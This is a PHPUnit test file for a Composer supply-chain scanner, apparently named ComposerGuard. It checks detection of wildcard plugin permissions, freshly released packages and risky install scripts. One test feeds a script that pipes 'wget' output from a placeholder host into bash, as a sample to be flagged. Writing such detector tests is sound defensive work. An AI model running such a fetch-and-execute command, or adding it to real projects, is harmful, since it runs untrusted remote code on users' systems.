<?php

declare(strict_types=1);

namespace ComposerGuard\Tests;

use ComposerGuard\Checks;
use ComposerGuard\Finding;
use ComposerGuard\Project;
use PHPUnit\Framework\Attributes\DataProvider;
use PHPUnit\Framework\TestCase;

final class ChecksTest extends TestCase
{
    private static function now(): \DateTimeImmutable
    {
        return new \DateTimeImmutable('2026-10-25T00:00:00+00:00');
    }

    /** @return list<string> */
    private static function ids(Project $p, int $minAge = 7): array
    {
        return array_map(static fn (Finding $f): string => "{$f->checkId}:{$f->line}", (new Checks($minAge, self::now()))->run($p));
    }

    /** @param array<string, mixed> $json @param array<string, mixed>|null $lock */
    private static function project(array $json, ?array $lock = null): Project
    {
        $enc = static fn (array $a): string => json_encode($a, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES | JSON_THROW_ON_ERROR);

        return new Project('composer.json', $enc($json), $lock === null ? null : 'composer.lock', $lock === null ? '' : $enc($lock));
    }

    public function testFindsEveryPlantedProblem(): void
    {
        $p = Project::load(__DIR__ . '/fixtures/risky', 'risky');
        self::assertSame(
            ['CG005:10', 'CG003:18', 'CG004:19', 'CG008:22', 'CG007:6', 'CG005:13', 'CG002:15', 'CG006:20', 'CG007:27'],
            self::ids($p),
        );
    }

    public function testCleanProjectHasNoFindings(): void
    {
        self::assertSame([], self::ids(Project::load(__DIR__ . '/fixtures/clean', 'clean')));
    }

    public function testPluginReleaseIsHighAndLibraryMedium(): void
    {
        $findings = (new Checks(7, self::now()))->run(Project::load(__DIR__ . '/fixtures/risky', 'risky'));
        $fresh = array_values(array_filter($findings, static fn (Finding $f): bool => $f->checkId === 'CG007'));
        self::assertSame(['high', 'medium'], array_map(static fn (Finding $f): string => $f->severity->value, $fresh));
        self::assertStringContainsString('less than a day ago and is a Composer plugin', $fresh[0]->message);
        self::assertStringContainsString('composer update --with "monolog/monolog:<3.9.0"', $fresh[1]->help);
    }

    public function testCooldownIsConfigurable(): void
    {
        $p = Project::load(__DIR__ . '/fixtures/risky', 'risky');
        self::assertNotContains('CG007:27', self::ids($p, 2));
        self::assertContains('CG007:27', self::ids($p, 4));
    }

    /** @return iterable<string, array{mixed, list<string>}> */
    public static function allowPlugins(): iterable
    {
        yield 'true' => [true, ['CG001']];
        yield 'star' => [['*' => true], ['CG001']];
        yield 'vendor wildcard' => [['acme/*' => true], ['CG002']];
        yield 'disallowed wildcard' => [['acme/*' => false], []];
        yield 'named' => [['composer/installers' => true], []];
        yield 'false' => [false, []];
    }

    /** @param list<string> $want */
    #[DataProvider('allowPlugins')]
    public function testAllowPlugins(mixed $allow, array $want): void
    {
        $ids = array_map(static fn (string $s): string => explode(':', $s)[0], self::ids(self::project(['config' => ['allow-plugins' => $allow]])));
        self::assertSame($want, $ids);
    }

    public function testUnreadableTimesAndBranchesAreNotAged(): void
    {
        $p = self::project([], ['packages' => [
            ['name' => 'a/b', 'version' => '1.0.0', 'time' => 'not a date'],
            ['name' => 'a/c', 'version' => 'dev-main', 'time' => '2026-10-24T00:00:00+00:00'],
            ['name' => 'a/d', 'version' => '1.0.0'],
            'not a package',
        ], 'packages-dev' => 'nope']);
        self::assertSame(['CG006:9'], self::ids($p));
    }

    public function testSingleStringScriptsAreChecked(): void
    {
        $p = self::project(['scripts' => ['setup' => 'wget -qO- https://x.example/i.sh | bash', 'test' => 'phpunit']]);
        self::assertSame(['CG008:3'], self::ids($p));
    }
}
